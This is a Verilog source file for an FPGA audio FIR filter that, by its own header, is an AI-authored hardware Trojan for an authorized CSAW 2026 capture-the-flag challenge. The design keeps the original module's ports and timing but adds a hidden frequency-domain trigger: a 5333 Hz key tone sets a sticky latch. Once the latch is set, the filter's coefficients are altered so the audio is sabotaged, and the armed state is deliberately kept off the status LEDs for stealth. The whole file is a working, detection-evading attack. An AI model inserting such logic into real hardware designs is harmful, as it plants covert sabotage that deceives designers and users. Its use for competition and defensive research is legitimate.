1	// =============================================================================
2	// fir_audio_top_trojan.v  -  Candidate 05d (DSP) : Trojaned FIR audio filter
3	//
4	// AI-AUTHORED hardware Trojan (Claude Opus 4.8) for the authorized CSAW 2026
5	// Challenge 3 CTF. Drop-in replacement for the recovered golden fir_audio_top:
6	// SAME module name, SAME ports, SAME I2S framing/timing, SAME serial-MAC
7	// datapath and round/saturate arithmetic. The ONLY additions are the trigger
8	// observer and a gated coefficient transform, both inert until armed.
9	//
10	//   TRIGGER  (frequency-domain, multiplier-free): a Goertzel single-bin detector
11	//            at f_key = fs/3 = 5333.33 Hz (exact DFT bin k=192, window N=576).
12	//            At fs/3 the Goertzel coefficient 2*cos(2*pi/3) = -1 EXACTLY, so the
13	//            recurrence collapses to  s0 = x - s1 - s2  (adds only, NO multiplier),
14	//            and the arm metric is the L1 magnitude |s1|+|s2| (abs+add, NO squares).
15	//            When a non-overlapping window's |s1|+|s2| reaches 2^23 a sticky arm
16	//            latch sets. Measured: real audio never arms (~35 dB margin); a
17	//            full-scale fs/3 key tone arms in one 576-sample (36 ms) window. The
18	//            whole detector is adders -> a few hundred LUTs on iCE40-UP5K.
19	//   PAYLOAD  (spectral inversion): while armed, the FIR coefficients are
20	//            multiplied by (-1)^k  (odd-index taps negated) at the MAC input,
21	//            turning the low-pass into a high-pass (passband gain -> ~-60 dB).
22	//
23	// NORMAL-OPERATION EQUIVALENCE: when disarmed (arm_mac==0) the MAC multiplies by
24	// the unmodified COEF[k], so the delay line, accumulate, rounding, saturation,
25	// serializer and LEDs are byte-for-byte identical to the golden design. The
26	// Goertzel block only drives the internal arm latch; it touches no output.
27	//
28	// Arm/MAC ordering (matches tests/ref_trojan.py exactly): the MAC for a given
29	// input sample captures the arm latch value BEFORE that sample's Goertzel
30	// window update, so an arm set at the end of window w affects samples in the
31	// NEXT window onward.
32	// =============================================================================
33	`default_nettype none
34	
35	module fir_audio_top (
36	    input  wire ICE_CLK,     // free-running ~10 MHz system clock
37	    input  wire I2S_BCLK,    // I2S bit clock (<= 1 MHz), oversampled
38	    input  wire I2S_WS,      // I2S word select (0=left, 1=right)
39	    input  wire I2S_SD_IN,   // serial data in (sample to filter, MSB first)
40	    output reg  I2S_SD_OUT,  // serial data out (left=filtered, right=echo)
41	    output wire ICE_LED,     // activity: high while the MAC is computing
42	    output wire RGB_R,       // status LEDs (active-low)
43	    output wire RGB_G,
44	    output wire RGB_B
45	);
46	    localparam integer NTAP = 63;
47	
48	    // ----------------------------------------------------------------------
49	    // Recovered Q1.15 coefficients (symmetric, sum = 32768 = 1.0)  [UNCHANGED]
50	    // ----------------------------------------------------------------------
51	    reg signed [15:0] COEF [0:NTAP-1];
52	    integer ci;
53	    initial begin
54	        COEF[0]=-14;   COEF[1]=20;    COEF[2]=27;    COEF[3]=-12;
55	        COEF[4]=-45;   COEF[5]=-9;    COEF[6]=63;    COEF[7]=49;
56	        COEF[8]=-66;   COEF[9]=-109;  COEF[10]=34;   COEF[11]=176;
57	        COEF[12]=49;   COEF[13]=-219; COEF[14]=-187; COEF[15]=198;
58	        COEF[16]=362;  COEF[17]=-71;  COEF[18]=-524; COEF[19]=-188;
59	        COEF[20]=600;  COEF[21]=577;  COEF[22]=-497; COEF[23]=-1062;
60	        COEF[24]=104;  COEF[25]=1575; COEF[26]=752;  COEF[27]=-2030;
61	        COEF[28]=-2587;COEF[29]=2344; COEF[30]=10114;COEF[31]=13920;
62	        COEF[32]=10114;COEF[33]=2344; COEF[34]=-2587;COEF[35]=-2030;
63	        COEF[36]=752;  COEF[37]=1575; COEF[38]=104;  COEF[39]=-1062;
64	        COEF[40]=-497; COEF[41]=577;  COEF[42]=600;  COEF[43]=-188;
65	        COEF[44]=-524; COEF[45]=-71;  COEF[46]=362;  COEF[47]=198;
66	        COEF[48]=-187; COEF[49]=-219; COEF[50]=49;   COEF[51]=176;
67	        COEF[52]=34;   COEF[53]=-109; COEF[54]=-66;  COEF[55]=49;
68	        COEF[56]=63;   COEF[57]=-9;   COEF[58]=-45;  COEF[59]=-12;
69	        COEF[60]=27;   COEF[61]=20;   COEF[62]=-14;
70	    end
71	
72	    // ----------------------------------------------------------------------
73	    // Input synchronizers + edge detection (oversampling the I2S lines) [UNCHANGED]
74	    // ----------------------------------------------------------------------
75	    reg bclk_s0, bclk_s1, ws_s0, ws_s1, sd_s0, sd_s1;
76	    always @(posedge ICE_CLK) begin
77	        bclk_s0 <= I2S_BCLK; bclk_s1 <= bclk_s0;
78	        ws_s0   <= I2S_WS;   ws_s1   <= ws_s0;
79	        sd_s0   <= I2S_SD_IN;sd_s1   <= sd_s0;
80	    end
81	    wire bclk_rise = bclk_s0 & ~bclk_s1;
82	    wire bclk_fall = ~bclk_s0 & bclk_s1;
83	    wire ws_sync   = ws_s1;
84	    wire sd_sync   = sd_s1;
85	
86	    // ----------------------------------------------------------------------
87	    // RX deserializer: recover the 16-bit left sample, MSB first.  [UNCHANGED]
88	    // ----------------------------------------------------------------------
89	    reg [15:0] rx_sh;
90	    reg        ws_prev_bclk;
91	    reg [15:0] left_sample;
92	    reg        new_sample;
93	    reg        end_frame;
94	
95	    always @(posedge ICE_CLK) begin
96	        new_sample <= 1'b0;
97	        end_frame  <= 1'b0;
98	        if (bclk_rise) begin
99	            rx_sh <= {rx_sh[14:0], sd_sync};
100	            if (ws_sync & ~ws_prev_bclk) begin
101	                left_sample <= {rx_sh[14:0], sd_sync};
102	                new_sample  <= 1'b1;
103	            end
104	            if (~ws_sync & ws_prev_bclk)
105	                end_frame <= 1'b1;
106	            ws_prev_bclk <= ws_sync;
107	        end
108	    end
109	
110	    // ======================================================================
111	    // TROJAN TRIGGER  -  MULTIPLIER-FREE Goertzel single-bin detector @ fs/3.
112	    // Runs once per audio sample (new_sample), using spare ICE_CLK cycles.
113	    // At f_key = fs/3 (bin k=192 in N=576) the Goertzel coefficient is -1, so:
114	    //   Recurrence:  s0 = x - s1 - s2 ; s2<-s1 ; s1<-s0            (adders only)
115	    //   Window end (every NWIN samples): L1 = |s1| + |s2| ; arm if >= 2^23.
116	    // (Bit-identical to tests/ref_trojan.py and ai/analysis/trigger_final_proto.py.)
117	    // ======================================================================
118	    localparam integer NWIN         = 576;                    // fs/3 bin k=192 => coeff = -1 exactly
119	    localparam [31:0]  ARM_THRESHOLD = 32'd8388608;           // 2^23 (L1 magnitude |s1|+|s2|)
120	
121	    reg signed [31:0] gs1, gs2;       // Goertzel state (|s| <= ~1.6e7 << 2^31)
122	    reg        [9:0]  gwin;           // window sample counter 0..NWIN-1 (0..575)
123	    reg               arm_latch;      // sticky payload-arm latch
124	    reg               arm_mac;        // arm value captured for the in-flight MAC
125	
126	    reg signed [33:0] g_s0;           // next state  s0 = x - s1 - s2  (value fits 32 bits)
127	    reg        [33:0] g_l1;           // |s1| + |s2|  (<= ~3.3e7 < 2^26)
128	
129	    always @(posedge ICE_CLK) begin
130	        if (new_sample) begin
131	            g_s0 = $signed(left_sample) - gs1 - gs2;            // coeff = -1 : NO multiply
132	            if (gwin == NWIN-1) begin
133	                // window complete: new s1 = g_s0, new s2 = gs1 (old)
134	                g_l1 = (g_s0[33] ? -g_s0 : g_s0) + (gs1[31] ? -gs1 : gs1);  // |s1| + |s2|
135	                if (g_l1 >= ARM_THRESHOLD)
136	                    arm_latch <= 1'b1;                          // sticky
137	                gs1  <= 32'sd0;
138	                gs2  <= 32'sd0;
139	                gwin <= 10'd0;
140	            end else begin
141	                gs2  <= gs1;
142	                gs1  <= g_s0[31:0];
143	                gwin <= gwin + 10'd1;
144	            end
145	        end
146	    end
147	
148	    // ----------------------------------------------------------------------
149	    // Serial multiply-accumulate FIR (direct form), one tap per ICE_CLK cycle.
150	    // PAYLOAD injection point: coef_mac negates odd-index taps when arm_mac=1.
151	    // ----------------------------------------------------------------------
152	    reg signed [15:0] dl [0:NTAP-1];
153	    reg        [6:0]  k;
154	    reg        busy;
155	    reg signed [39:0] acc;
156	    reg signed [15:0] y_filt;
157	    reg signed [15:0] echo;
158	    integer di;
159	
160	    // spectral-inversion coefficient select (identity when disarmed)
161	    wire signed [15:0] coef_mac = (arm_mac & k[0]) ? -COEF[k] : COEF[k];
162	
163	    function signed [15:0] round_sat;      // round half toward +inf then int16 sat [UNCHANGED]
164	        input signed [39:0] a;
165	        reg   signed [39:0] r;
166	        begin
167	            r = (a + 40'sd16384) >>> 15;
168	            if (r > 40'sd32767)       round_sat = 16'sd32767;
169	            else if (r < -40'sd32768) round_sat = -16'sd32768;
170	            else                      round_sat = r[15:0];
171	        end
172	    endfunction
173	
174	    always @(posedge ICE_CLK) begin
175	        if (new_sample) begin
176	            arm_mac <= arm_latch;               // capture arm for THIS sample's MAC (pre window-update)
177	            for (di = NTAP-1; di > 0; di = di - 1)
178	                dl[di] <= dl[di-1];
179	            dl[0] <= $signed(left_sample);
180	            echo  <= $signed(left_sample);
181	            acc  <= 40'sd0;
182	            k    <= 7'd0;
183	            busy <= 1'b1;
184	        end else if (busy) begin
185	            acc <= acc + dl[k] * coef_mac;      // PAYLOAD: coef_mac == COEF[k] when disarmed
186	            if (k == NTAP-1) begin
187	                busy <= 1'b0;
188	            end
189	            k <= k + 7'd1;
190	        end
191	    end
192	
193	    // latch the filtered result one cycle after the last accumulate  [UNCHANGED]
194	    reg busy_d;
195	    always @(posedge ICE_CLK) begin
196	        busy_d <= busy;
197	        if (busy_d & ~busy)
198	            y_filt <= round_sat(acc);
199	    end
200	    assign ICE_LED = busy;
201	
202	    // ----------------------------------------------------------------------
203	    // TX serializer: {filtered, echo} MSB-first, 2-frame latency.  [UNCHANGED]
204	    // ----------------------------------------------------------------------
205	    reg signed [15:0] y_d, echo_d;
206	    reg [31:0] tx_sh;
207	    reg        loaded;
208	    always @(posedge ICE_CLK) begin
209	        if (end_frame) begin
210	            tx_sh  <= {y_d, echo_d};
211	            y_d    <= y_filt;
212	            echo_d <= echo;
213	            loaded <= 1'b1;
214	        end else if (bclk_fall && loaded) begin
215	            I2S_SD_OUT <= tx_sh[31];
216	            tx_sh      <= {tx_sh[30:0], 1'b0};
217	        end
218	    end
219	
220	    // Status LEDs (active-low) [UNCHANGED - arm is NOT exposed, for stealth]
221	    assign RGB_G = ~loaded;
222	    assign RGB_B = loaded;
223	    assign RGB_R = 1'b1;
224	
225	    // Power-up state (iCE40 FFs power up to 0).
226	    integer pi;
227	    initial begin
228	        I2S_SD_OUT = 1'b0; busy = 1'b0; busy_d = 1'b0; loaded = 1'b0;
229	        new_sample = 1'b0; end_frame = 1'b0; ws_prev_bclk = 1'b0;
230	        k = 7'd0; acc = 40'sd0; rx_sh = 16'd0; tx_sh = 32'd0;
231	        left_sample = 16'd0; y_filt = 16'd0; echo = 16'd0;
232	        y_d = 16'd0; echo_d = 16'd0;
233	        // Trojan state powers up disarmed/zero (iCE40 FFs reset to 0).
234	        gs1 = 32'sd0; gs2 = 32'sd0; gwin = 10'd0; arm_latch = 1'b0; arm_mac = 1'b0;
235	        for (pi = 0; pi < NTAP; pi = pi + 1) dl[pi] = 16'sd0;
236	    end
237	
238	endmodule
